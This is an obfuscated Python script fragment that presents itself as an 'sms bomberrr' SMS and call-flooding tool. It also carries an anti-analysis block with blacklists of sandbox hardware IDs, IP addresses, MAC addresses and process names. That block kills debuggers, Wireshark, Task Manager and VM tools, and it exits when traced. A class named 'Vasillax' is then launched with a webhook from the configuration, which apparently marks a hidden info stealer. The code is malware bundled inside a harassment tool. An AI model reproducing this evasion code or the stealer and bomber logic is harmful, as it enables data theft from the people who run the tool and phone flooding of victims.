        OO00O0OOO00OOOOOO .blackListedHWIDS =['7AB5C494-39F5-4941-9163-47F54D6D5016','03DE0294-0480-05DE-1A06-350700080009','11111111-2222-3333-4444-555555555555','6F3CA5EC-BEC9-4A4D-8274-11168F640058','ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548','4C4C4544-0050-3710-8058-CAC04F59344A','00000000-0000-0000-0000-AC1F6BD04972','00000000-0000-0000-0000-000000000000','5BD24D56-789F-8468-7CDC-CAA7222CC121','49434D53-0200-9065-2500-65902500E439','49434D53-0200-9036-2500-36902500F022','777D84B3-88D1-451C-93E4-D235177420A7','49434D53-0200-9036-2500-369025000C65','B1112042-52E8-E25B-3655-6A4F54155DBF','00000000-0000-0000-0000-AC1F6BD048FE','EB16924B-FB6D-4FA1-8666-17B91F62FB37','A15A930C-8251-9645-AF63-E45AD728C20C','67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3','C7D23342-A5D4-68A1-59AC-CF40F735B363','63203342-0EB0-AA1A-4DF5-3FB37DBB0670','44B94D56-65AB-DC02-86A0-98143A7423BF','6608003F-ECE4-494E-B07E-1C4615D1D93C','D9142042-8F51-5EFF-D5F8-EE9AE3D1602A','49434D53-0200-9036-2500-369025003AF0','8B4E8278-525C-7343-B825-280AEBCD3BCB','4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27','79AF5279-16CF-4094-9758-F88A616D81B4','FF577B79-782E-0A4D-8568-B35A9B7EB76B','08C1E400-3C56-11EA-8000-3CECEF43FEDE','6ECEAF72-3548-476C-BD8D-73134A9182C8','49434D53-0200-9036-2500-369025003865','119602E8-92F9-BD4B-8979-DA682276D385','12204D56-28C0-AB03-51B7-44A8B7525250','63FA3342-31C7-4E8E-8089-DAFF6CE5E967','365B4000-3B25-11EA-8000-3CECEF44010C','D8C30328-1B06-4611-8E3C-E433F4F9794E','00000000-0000-0000-0000-50E5493391EF','00000000-0000-0000-0000-AC1F6BD04D98','4CB82042-BA8F-1748-C941-363C391CA7F3','B6464A2B-92C7-4B95-A2D0-E5410081B812','BB233342-2E01-718F-D4A1-E7F69D026428','9921DE3A-5C1A-DF11-9078-563412000026','CC5B3F62-2A04-4D2E-A46C-AA41B7050712','00000000-0000-0000-0000-AC1F6BD04986','C249957A-AA08-4B21-933F-9271BEC63C85','BE784D56-81F5-2C8D-9D4B-5AB56F05D86E','ACA69200-3C4C-11EA-8000-3CECEF4401AA','3F284CA4-8BDF-489B-A273-41B44D668F6D','BB64E044-87BA-C847-BC0A-C797D1A16A50','2E6FB594-9D55-4424-8E74-CE25A25E36B0','42A82042-3F13-512F-5E3D-6BF4FFFD8518','38AB3342-66B0-7175-0B23-F390B3728B78','48941AE9-D52F-11DF-BBDA-503734826431','032E02B4-0499-05C3-0806-3C0700080009','DD9C3342-FB80-9A31-EB04-5794E5AE2B4C','E08DE9AA-C704-4261-B32D-57B2A3993518','07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9','88DC3342-12E6-7D62-B0AE-C80E578E7B07','5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E','96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE','0934E336-72E4-4E6A-B3E5-383BD8E938C3','12EE3342-87A2-32DE-A390-4C2DA4D512E9','38813342-D7D0-DFC8-C56F-7FC9DFE5C972','8DA62042-8B59-B4E3-D232-38B29A10964A','3A9F3342-D1F2-DF37-68AE-C10F60BFB462','F5744000-3C78-11EA-8000-3CECEF43FEFE','FA8C2042-205D-13B0-FCB5-C5CC55577A35','C6B32042-4EC3-6FDF-C725-6F63914DA7C7','FCE23342-91F1-EAFC-BA97-5AAE4509E173','CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F','050C3342-FADD-AEDF-EF24-C6454E1A73C9','4DC32042-E601-F329-21C1-03F27564FD6C','DEAEB8CE-A573-9F48-BD40-62ED6C223F20','05790C00-3B21-11EA-8000-3CECEF4400D0','5EBD2E42-1DB8-78A6-0EC3-031B661D5C57','9C6D1742-046D-BC94-ED09-C36F70CC9A91','907A2A79-7116-4CB6-9FA5-E5A58C4587CD','A9C83342-4800-0578-1EE8-BA26D2A678D2','D7382042-00A0-A6F0-1E51-FD1BBF06CD71','1D4D3342-D6C4-710C-98A3-9CC6571234D5','CE352E42-9339-8484-293A-BD50CDC639A5','60C83342-0A97-928D-7316-5F1080A78E72','02AD9898-FA37-11EB-AC55-1D0C0A67EA8A','DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F','FED63342-E0D6-C669-D53F-253D696D74DA','2DD1B176-C043-49A4-830F-C623FFB88F3C','4729AEB0-FC07-11E3-9673-CE39E79C8A00','84FE3342-6C67-5FC6-5639-9B3CA3D775A1','DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D','CEFC836C-8CB1-45A6-ADD7-209085EE2A57','A7721742-BE24-8A1C-B859-D7F8251A83D3','3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E','D2DC3342-396C-6737-A8F6-0C6673C1DE08','EADD1742-4807-00A0-F92E-CCD933E9D8C1','AF1B2042-4B90-0000-A4E4-632A1C8C7EB1','FE455D1A-BE27-4BA4-96C8-967A6D3A9661','921E2042-70D3-F9F1-8CBD-B398A21F89C6']#line:948
        OO00O0OOO00OOOOOO .blackListedIPS =['88.132.231.71','78.139.8.50','20.99.160.173','88.153.199.169','84.147.62.12','194.154.78.160','92.211.109.160','195.74.76.222','188.105.91.116','34.105.183.68','92.211.55.199','79.104.209.33','95.25.204.90','34.145.89.174','109.74.154.90','109.145.173.169','34.141.146.114','212.119.227.151','195.239.51.59','192.40.57.234','64.124.12.162','34.142.74.220','188.105.91.173','109.74.154.91','34.105.72.241','109.74.154.92','213.33.142.50','109.74.154.91','93.216.75.209','192.87.28.103','88.132.226.203','195.181.175.105','88.132.225.100','92.211.192.144','34.83.46.130','188.105.91.143','34.85.243.241','34.141.245.25','178.239.165.70','84.147.54.113','193.128.114.45','95.25.81.24','92.211.52.62','88.132.227.238','35.199.6.13','80.211.0.97','34.85.253.170','23.128.248.46','35.229.69.227','34.138.96.23','192.211.110.74','35.237.47.12','87.166.50.213','34.253.248.228','212.119.227.167','193.225.193.201','34.145.195.58','34.105.0.27','195.239.51.3','35.192.93.107']#line:956
        OO00O0OOO00OOOOOO .blackListedMacs =['00:15:5d:00:07:34','00:e0:4c:b8:7a:58','00:0c:29:2c:c1:21','00:25:90:65:39:e4','c8:9f:1d:b6:58:e4','00:25:90:36:65:0c','00:15:5d:00:00:f3','2e:b8:24:4d:f7:de','00:15:5d:13:6d:0c','00:50:56:a0:dd:00','00:15:5d:13:66:ca','56:e8:92:2e:76:0d','ac:1f:6b:d0:48:fe','00:e0:4c:94:1f:20','00:15:5d:00:05:d5','00:e0:4c:4b:4a:40','42:01:0a:8a:00:22','00:1b:21:13:15:20','00:15:5d:00:06:43','00:15:5d:1e:01:c8','00:50:56:b3:38:68','60:02:92:3d:f1:69','00:e0:4c:7b:7b:86','00:e0:4c:46:cf:01','42:85:07:f4:83:d0','56:b0:6f:ca:0a:e7','12:1b:9e:3c:a6:2c','00:15:5d:00:1c:9a','00:15:5d:00:1a:b9','b6:ed:9d:27:f4:fa','00:15:5d:00:01:81','4e:79:c0:d9:af:c3','00:15:5d:b6:e0:cc','00:15:5d:00:02:26','00:50:56:b3:05:b4','1c:99:57:1c:ad:e4','08:00:27:3a:28:73','00:15:5d:00:00:c3','00:50:56:a0:45:03','12:8a:5c:2a:65:d1','00:25:90:36:f0:3b','00:1b:21:13:21:26','42:01:0a:8a:00:22','00:1b:21:13:32:51','a6:24:aa:ae:e6:12','08:00:27:45:13:10','00:1b:21:13:26:44','3c:ec:ef:43:fe:de','d4:81:d7:ed:25:54','00:25:90:36:65:38','00:03:47:63:8b:de','00:15:5d:00:05:8d','00:0c:29:52:52:50','00:50:56:b3:42:33','3c:ec:ef:44:01:0c','06:75:91:59:3e:02','42:01:0a:8a:00:33','ea:f6:f1:a2:33:76','ac:1f:6b:d0:4d:98','1e:6c:34:93:68:64','00:50:56:a0:61:aa','42:01:0a:96:00:22','00:50:56:b3:21:29','00:15:5d:00:00:b3','96:2b:e9:43:96:76','b4:a9:5a:b1:c6:fd','d4:81:d7:87:05:ab','ac:1f:6b:d0:49:86','52:54:00:8b:a6:08','00:0c:29:05:d8:6e','00:23:cd:ff:94:f0','00:e0:4c:d6:86:77','3c:ec:ef:44:01:aa','00:15:5d:23:4c:a3','00:1b:21:13:33:55','00:15:5d:00:00:a4','16:ef:22:04:af:76','00:15:5d:23:4c:ad','1a:6c:62:60:3b:f4','00:15:5d:00:00:1d','00:50:56:a0:cd:a8','00:50:56:b3:fa:23','52:54:00:a0:41:92','00:50:56:b3:f6:57','00:e0:4c:56:42:97','ca:4d:4b:ca:18:cc','f6:a5:41:31:b2:78','d6:03:e4:ab:77:8e','00:50:56:ae:b2:b0','00:50:56:b3:94:cb','42:01:0a:8e:00:22','00:50:56:b3:4c:bf','00:50:56:b3:09:9e','00:50:56:b3:38:88','00:50:56:a0:d0:fa','00:50:56:b3:91:c8','3e:c1:fd:f1:bf:71','00:50:56:a0:6d:86','00:50:56:a0:af:75','00:50:56:b3:dd:03','c2:ee:af:fd:29:21','00:50:56:b3:ee:e1','00:50:56:a0:84:88','00:1b:21:13:32:20','3c:ec:ef:44:00:d0','00:50:56:ae:e5:d5','00:50:56:97:f6:c8','52:54:00:ab:de:59','00:50:56:b3:9e:9e','00:50:56:a0:39:18','32:11:4d:d0:4a:9e','00:50:56:b3:d0:a7','94:de:80:de:1a:35','00:50:56:ae:5d:ea','00:50:56:b3:14:59','ea:02:75:3c:90:9f','00:e0:4c:44:76:54','ac:1f:6b:d0:4d:e4','52:54:00:3b:78:24','00:50:56:b3:50:de','7e:05:a3:62:9c:4d','52:54:00:b3:e4:71','90:48:9a:9d:d5:24','00:50:56:b3:3b:a6','92:4c:a8:23:fc:2e','5a:e2:a6:a4:44:db','00:50:56:ae:6f:54','42:01:0a:96:00:33','00:50:56:97:a1:f8','5e:86:e4:3d:0d:f6','00:50:56:b3:ea:ee','3e:53:81:b7:01:13','00:50:56:97:ec:f2','00:e0:4c:b3:5a:2a','12:f8:87:ab:13:ec','00:50:56:a0:38:06','2e:62:e8:47:14:49','00:0d:3a:d2:4f:1f','60:02:92:66:10:79','','00:50:56:a0:d7:38','be:00:e5:c5:0c:e5','00:50:56:a0:59:10','00:50:56:a0:06:8d','00:e0:4c:cb:62:08','4e:81:81:8e:22:4e']#line:976
        OO00O0OOO00OOOOOO .blacklistedProcesses =["httpdebuggerui","wireshark","fiddler","regedit","cmd","taskmgr","vboxservice","df5serv","processhacker","vboxtray","vmtoolsd","vmwaretray","ida64","ollydbg","pestudio","vmwareuser","vgauthservice","vmacthlp","x96dbg","vmsrvc","x32dbg","vmusrvc","prl_cc","prl_tools","xenservice","qemu-ga","joeboxcontrol","ksdumperclient","ksdumper","joeboxserver"]#line:980
        OO00O0OOO00OOOOOO .check_process ()#line:982
        if OO00O0OOO00OOOOOO .get_network ():#line:983
            O0O0OO00OOO000OOO =True #line:984
        if OO00O0OOO00OOOOOO .get_system ():#line:985
            O0O0OO00OOO000OOO =True #line:986
        return O0O0OO00OOO000OOO #line:987
    def check_process (O0OOOO00O0OO000O0 )->bool :#line:989
        for OOO0OO0OO00O00OO0 in psutil .process_iter ():#line:990
            if any (O00000000O0000OO0 in OOO0OO0OO00O00OO0 .name ().lower ()for O00000000O0000OO0 in O0OOOO00O0OO000O0 .blacklistedProcesses ):#line:991
                try :#line:992
                    OOO0OO0OO00O00OO0 .kill ()#line:993
                except (psutil .NoSuchProcess ,psutil .AccessDenied ):#line:994
                    pass #line:995
        if sys .gettrace ():#line:996
            sys .exit (0 )#line:997
    def get_network (O00O0OO000O0O0O0O )->bool :#line:999
        O0OOO0O00OO0OO000 =requests .get ('https://api.ipify.org').text #line:1000
        OO00OO000OOO00O0O ,O000O0O0000OO0OO0 =next (iter (psutil .net_if_addrs ().items ()))#line:1001
        OO000OO0000O00O0O =O000O0O0000OO0OO0 [0 ].address #line:1002
        if O0OOO0O00OO0OO000 in O00O0OO000O0O0O0O .blackListedIPS :#line:1004
            return True #line:1005
        if OO000OO0000O00O0O in O00O0OO000O0O0O0O .blackListedMacs :#line:1006
            return True #line:1007
    def get_system (O000OO00OO0OOOOO0 )->bool :#line:1009
        O00OOO00OO00OOO00 =os .getenv ("UserName")#line:1010
        OOOO0O0OO000O0000 =os .getenv ("COMPUTERNAME")#line:1011
        O00O0O000O00O0OO0 =subprocess .check_output ('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid',shell =True ,stdin =subprocess .PIPE ,stderr =subprocess .PIPE ).decode ('utf-8').split ('\n')[1 ].strip ()#line:1013
        if O00O0O000O00O0OO0 in O000OO00OO0OOOOO0 .blackListedHWIDS :#line:1015
            return True #line:1016
        if O00OOO00OO00OOO00 in O000OO00OO0OOOOO0 .blackListedUsers :#line:1017
            return True #line:1018
        if OOOO0O0OO000O0000 in O000OO00OO0OOOOO0 .blackListedPCNames :#line:1019
            return True #line:1020
    def self_destruct (O00OOO00O0O000O00 )->None :#line:1022
        sys .exit (0 )#line:1023
if __name__ =='__main__'and os .name =="nt":#line:1026
    Vasillax (__CONFIG__ ["webhook"])#line:1027
from time import sleep #line:1029
from os import system #line:1030
import time #line:1031
from colorama import Fore ,Style #line:1032
def printLow (O0OOOOOOOOOO00OOO ):#line:1033
    for O0OO00OO00OOO0000 in O0OOOOOOOOOO00OOO :#line:1034
        print (O0OO00OO00OOO0000 ,end ='',flush =True )#line:1035
        sleep (0.0009 )#line:1036
system ("cls||clear")#line:1037
printLow ("""{}                                                                                                                                                                      
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BP5Y77777JYPB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@5??JJ75JYYYJ?7J&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&PB#BBGBGBBBBBBG&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&###&&&&&&####&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#PP5YPGGPPP5PBB@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&J!7777!7!!!7JP@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P?7^^^:^^:::^~?B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BGY????777777??5&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B55YYYYJJJJYY5PG#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@GY#@@&5B@@@@@@@&Y!~~^^::^::^^^7YP&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@5 ?@@Y G@&BBB&@B?~~~~^.:~. ~^ ~Y55BB&@#B@@B#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@~.#&.7@&77J^^&J.:^:^^ :~..~^ ~J!^?7.PB:!J:G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@G ?Y.#@&J?5! PY::::^^ .~..~^ ~?7~JY 7@B  P@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@! .J@@? ?B~ J?^^^ .^ .~. ~: ^! :5J 7&!~~:B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@B77#@@#J?JY7?7::::^^.:^::~^:~7~~~J?55?&&?J&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&J7!~~~~^^^^~~^~!!7?Y5G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P?!!~~~~~~^~~~~~~!7?JY5#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&Y?!~~~~~~~~~~~~~~!77?Y5B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BJ7!~!~~~~~~~~~~~!!7??Y5G&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&5J7!!!!~~!~~~~!~~!!7??J5Y#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&Y5Y?7!!!!!!~~!!~!!77?JY5PP&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@GJYJ??777~~!~!!!~~~7?7??YPPB@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@5??777!!!!~~!!!!!~!JJ7?JJYYP@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#YJ?777!!!!!!!!!777!!7J??JYYY&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B5?7777777!777!7777777?JYY5PPP@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&5YJ?77?7!!!77!777777777?YYPGBG&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@PJJ?77??!!!!!7!777777????JJY5P5&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&5J?777!!77!!!!777777777??JY5555&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#J??7!!!!!!!!!7777!77777???JJ5Y5#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&J?777!!!7777777777!777??JYYYJ??B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Y777JJY5YJ??~!!??7^??^J~7???PYJ#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@YJYYJY?J?J^YJ~7J?7?J?!J~J?7!5G?B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@J55Y?Y!Y?~^7?!7J!7?JYJYYJJJJ5#?G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@YYPY?Y??J7^!7J7??YJ5J!!7!77JY5JG@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Y5PY??YGPGY?J?7!~^.::!JY?7~!77?B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@YY5J5GBBPJJ?!^^:...^J5YPBPPY77?P@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@JYGGBP5GG?J?7JYJ7:~55PPPBGPG7??5@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Y?J77YGP5?7!!?J?JYPGYYYGGGPP?J?5@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@5JJJJJ?JJY??7JJ?5?J?JJ?JY5YY5YYY@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Y?JY?7777J7777??J7777?7??J?J5JJY@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P55YYYYYYYYYY55555555555PPPPGGGG@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BGGGPPPPPPPPPGGGGGGGGGGGGGGBBBBB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&GGGGPPPPPPPPPGGGGGGGGGGGGGBBBB#G&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&GGGGPPPPPPPPPGGGGGGGGGGGGGGBB##G&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##BGGPPGGGPPGGGGBBBGBBBBBBB####B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#&&&&####BBGGBB###&@@@@@@@@@@&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&####BBBBBBBB#&&&&&@@@&@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

    """.format (Fore .MAGENTA ))#line:1087
printLow (Style .RESET_ALL +Fore .BLUE +'                                                                                 sms bomberrr\n')#line:1089
printLow (Fore .GREEN +"vasillax prestens")#line:1091
from colorama import Fore ,Style #line:1094
from time import sleep #line:1095
from os import system #line:1096
from sms import SendSms #line:1097
from call import SendCall #line:1098
servisler_call =[]#line:1100
for attribute in dir (SendCall ):#line:1101
    attribute_value =getattr (SendCall ,attribute )#line:1102
    if callable (attribute_value ):#line:1103
        if attribute .startswith ('__')==False :#line:1104
            servisler_call .append (attribute )#line:1105
servisler_sms =[]#line:1106
for attribute in dir (SendSms ):#line:1107
    attribute_value =getattr (SendSms ,attribute )#line:1108
    if callable (attribute_value ):#line:1109
        if attribute .startswith ('__')==False :#line:1110
            servisler_sms .append (attribute )#line:1111
while 1 :#line:1113
    system ("cls||clear")#line:1114
    print ("""{}
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BP5Y77777JYPB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@5??JJ75JYYYJ?7J&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&PB#BBGBGBBBBBBG&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&###&&&&&&####&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#PP5YPGGPPP5PBB@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&J!7777!7!!!7JP@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P?7^^^:^^:::^~?B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BGY????777777??5&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B55YYYYJJJJYY5PG#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@GY#@@&5B@@@@@@@&Y!~~^^::^::^^^7YP&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@5 ?@@Y G@&BBB&@B?~~~~^.:~. ~^ ~Y55BB&@#B@@B#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@~.#&.7@&77J^^&J.:^:^^ :~..~^ ~J!^?7.PB:!J:G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@G ?Y.#@&J?5! PY::::^^ .~..~^ ~?7~JY 7@B  P@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@! .J@@? ?B~ J?^^^ .^ .~. ~: ^! :5J 7&!~~:B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@B77#@@#J?JY7?7::::^^.:^::~^:~7~~~J?55?&&?J&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&J7!~~~~^^^^~~^~!!7?Y5G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P?!!~~~~~~^~~~~~~!7?JY5#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&Y?!~~~~~~~~~~~~~~!77?Y5B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BJ7!~!~~~~~~~~~~~!!7??Y5G&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&5J7!!!!~~!~~~~!~~!!7??J5Y#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&Y5Y?7!!!!!!~~!!~!!77?JY5PP&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@GJYJ??777~~!~!!!~~~7?7??YPPB@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@5??777!!!!~~!!!!!~!JJ7?JJYYP@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#YJ?777!!!!!!!!!777!!7J??JYYY&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B5?7777777!777!7777777?JYY5PPP@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&5YJ?77?7!!!77!777777777?YYPGBG&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@PJJ?77??!!!!!7!777777????JJY5P5&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&5J?777!!77!!!!777777777??JY5555&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#J??7!!!!!!!!!7777!77777???JJ5Y5#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&J?777!!!7777777777!777??JYYYJ??B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Y777JJY5YJ??~!!??7^??^J~7???PYJ#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
